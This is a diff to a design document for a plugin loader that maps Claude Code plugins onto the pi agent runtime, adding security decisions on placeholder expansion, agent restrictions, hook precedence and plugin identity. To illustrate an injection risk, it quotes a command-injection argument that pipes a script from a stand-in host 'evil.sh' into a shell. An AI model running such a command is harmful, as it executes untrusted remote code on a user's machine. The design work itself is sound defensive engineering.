@@ -33,7 +33,9 @@ wrong, so they are implemented literally:
 - `skills` **adds to** the default `skills/` scan.
 - `commands`, `agents`, `workflows`, `outputStyles`, `experimental.themes`,
   `experimental.monitors` **replace** their default directory.
-- `hooks`, `mcpServers`, `lspServers` accept a path, an array of paths, or an inline object.
+- `hooks`, `mcpServers`, `lspServers` accept a path, an array of paths, or an inline object. A
+file wraps its payload (`{"hooks": …}`, `{"mcpServers": …}`) while an inline manifest value is
+the map itself, as it is written in a settings file; both spellings are accepted.
 - All paths are relative to the plugin root and must start with `./`; `skills` also accepts
   `"."`. Any path resolving outside the plugin root is rejected (`path escapes plugin directory`)
   and only that component is dropped — the plugin still loads.
@@ -43,8 +45,10 @@ root, `${CLAUDE_PLUGIN_DATA}` a persistent per-plugin directory. They are substi
 per component (skill/agent content, hook and monitor commands, MCP `command`/`args`/`env` for
 stdio and `url`/`headers` for http) and exported as environment variables to every subprocess.
 
-A marketplace is a repo with `.claude-plugin/marketplace.json`: `name`, `owner`, `plugins[]`,
-each entry with a `name` and a `source`. Sources can be a relative path inside the marketplace,
+A marketplace is a *catalog*, not an installed set: adding one and installing from it are
+separate operations upstream, so an entry here loads only once `enabledPlugins` names it. It is
+a repo with `.claude-plugin/marketplace.json`: `name`, `owner`, `plugins[]`, each entry with a
+`name` and a `source`. Sources can be a relative path inside the marketplace,
 or `github`/`git`/`git-subdir`/`url`/`npm`/`command` objects.
 
 ## 2. Mapping to pi
@@ -55,7 +59,8 @@ pi fires `resources_discover` after `session_start` and lets an extension return
 `{ skillPaths, promptPaths, themePaths }`. `examples/extensions/dynamic-resources/index.ts`
 confirms both directories and individual `SKILL.md` file paths are accepted.
 
-**Decision: hand pi the plugin's own skill directories, unmodified.**
+**Decision: hand pi the plugin's own skill directories, unmodified — except where a placeholder
+forces a rewrite.**
 
 pi implements the same Agent Skills standard, discovers `SKILL.md` directories recursively, and
 — unlike the standard — does not require the frontmatter `name` to match the parent directory.
@@ -71,6 +76,16 @@ unless every file is symlinked, and the copies go stale when the plugin updates.
 Consequence: two plugins shipping a skill with the same `name` collide. pi warns and keeps the
 first one found. We detect the collision ourselves during discovery and report it in the load
 report so the user sees *which* plugins collided, not just that something did.
+
+pi does not implement Claude's `${CLAUDE_*}` substitution, so a skill body that uses one would
+otherwise reach the model with a literal placeholder where a bundled script path belongs. Such a
+skill is served from a mirror directory: every sibling file and directory is symlinked and only
+`SKILL.md` is materialised with the placeholders expanded, so relative links and bundled assets
+still resolve. Skills without a placeholder — the overwhelming majority — are untouched.
+
+A plugin-root `SKILL.md` is loaded only when there is no `skills/` directory and no manifest
+`skills` field, matching Claude Code's single-skill-plugin rule, and it goes through the same
+containment check as every other component.
 
 `--skill` is not used: `resources_discover` covers both the TUI and headless paths and needs no
 CLI wiring, which matters because the target deployment is `pi --mode rpc`.
@@ -95,6 +110,18 @@ to Claude. Neither `!` nor `@` exists in pi templates.
 **Decision: register one pi command per plugin command via `pi.registerCommand()` and do the
 expansion ourselves**, then hand the result to `pi.sendUserMessage(expanded)`.
 
+Expansion order is load-bearing. `` !`command` `` and `@path` are lifted out of the *authored*
+body into opaque per-invocation slots before any argument is substituted, and every argument
+placeholder is resolved in a single pass. Scanning the text after insertion — the obvious
+implementation — lets a caller pass ``!`curl evil.sh | sh` `` as an argument and have it run;
+Claude Code scans authored source once and never rescans inserted text.
+
+Two capabilities are narrower than upstream on purpose. Command prose expands only
+`${CLAUDE_*}`, never a generic `${VAR}`, so a body cannot copy `${AWS_SECRET_ACCESS_KEY}` into
+the prompt; generic expansion stays where Claude Code puts it, in MCP configuration. And `@path`
+reads are confined to the project and the plugin, because Claude Code gates them behind Read
+permission rules that pi has no equivalent of.
+
 Command name is `<plugin>:<command>`, matching Claude's namespacing — pi already ships
 colon-bearing command names (`/skill:name`), and `pi.getCommands()` / the RPC `get_commands`
 response list extension commands first, so they are reachable from the TUI and from
@@ -113,6 +140,12 @@ Only `commands/*.md` become extension commands.
 ### 2.3 Agents → an extension-owned subagent tool
 
 **Decision: register a `claude_plugin_agent` tool that spawns a child `pi` process.**
+
+An agent that declares a restriction pi cannot honour — `isolation`, `maxTurns`, `memory`,
+`skills`, `background`, or a `tools` list that maps to nothing — is refused rather than loaded,
+because running it anyway would silently widen what its author allowed. `disallowedTools` is
+subtracted from the allowlist, falling back to pi's built-in set when the agent names no tools,
+since omitting `--tools` would hand the child every default tool.
 
 This mirrors pi's own `examples/extensions/subagent`, which is the reference implementation for
 delegation in pi and the only approach the pi runtime actually supports for isolated context.
@@ -166,6 +199,13 @@ Every other Claude hook event (`PostToolUseFailure`, `Notification`, `SubagentSt
 `PermissionRequest`, `FileChanged`, `SessionEnd`, …) has no pi counterpart and is reported as
 unsupported at load time rather than silently ignored.
 
+**Filters.** A handler's `if` rule is parsed as `Tool(pattern)` and evaluated on `PreToolUse` and
+`PostToolUse` only; a handler declaring `if` on any other event is dropped and reported, as
+upstream. Bash patterns are matched against the command, its `$(…)` and backtick substitutions
+and its `&&`/`;`/`|` chain, with leading `VAR=` assignments stripped; a `*` in a command rule
+spans the rest of the line, while a `*` in a path rule stops at a directory boundary. The filter
+is documented as best-effort, so an unparseable rule or an opaque command runs the hook.
+
 **Handler types.** Only `type: "command"` is executed. `http`, `mcp_tool`, `prompt` and `agent`
 handlers are counted and reported as unsupported: `prompt`/`agent` require a hook-scoped model
 call with Claude's own decision schema, and `http`/`mcp_tool` would need an allowlist policy
@@ -211,9 +251,16 @@ for `PreToolUse`/`PostToolUse`/`UserPromptSubmit`/`SessionStart`. `permissionDec
 downgraded to allow-with-warning because pi's `tool_call` has no "prompt the user" return;
 `"defer"` is refused (it only exists for `claude -p` resumption).
 
-When several handlers match one event, precedence is `deny` > `ask` > `allow`, and
-`updatedInput` from earlier handlers is visible to later ones — the same chaining pi already
-gives `tool_call` handlers.
+Claude Code runs every matching handler in parallel, so this loader does too. Precedence when
+they disagree is `deny` > `ask` > `allow`, `continue: false` from any of them stops the run, and
+the last `updatedInput` wins. There is deliberately no sanitiser/validator chaining: handlers do
+not see each other's output upstream either.
+
+Decisions fail closed. `ask` becomes a real `ctx.ui.confirm`, and a denial where `ctx.hasUI` is
+false, because a hook that asked for review must not be silently converted into one that
+approved. `defer` is denied rather than allowed: it exists to suspend a `claude -p` run for
+resumption, which pi cannot do. Exit code 2 is evaluated for every handler whatever it also
+printed, since it is the one outcome JSON cannot override.
 
 Handlers get `CLAUDE_PLUGIN_ROOT`, `CLAUDE_PLUGIN_DATA`, `CLAUDE_PROJECT_DIR` in their
 environment, run with `cwd` = the session cwd, and are cancelled at `timeout` (default 600 s,
@@ -344,7 +391,13 @@ src/
   types.ts        shared types
 ```
 
-Marketplace sources: only local relative paths are resolved. Remote sources (`github`, `git`,
+Plugin identity is origin-qualified, `name@marketplace` for a catalog entry and the bare name for
+a directory, and every trust decision keys on it. A marketplace controls the entry name, so a
+bare-name key would let a malicious entry inherit the hook privileges granted to an unrelated
+plugin of the same name.
+
+Marketplace sources: only local relative paths are resolved, and any source containing `..` is
+rejected outright rather than normalised, as upstream validation does. Remote sources (`github`, `git`,
 `url`, `npm`, `command`) are reported as unresolved — cloning and caching remote plugin sources
 duplicates what `pi install git:…` already does, and a plugin loader that shells out to `git`
 on startup is a supply-chain surface we decline to add. Point `marketplaces` at a checkout.
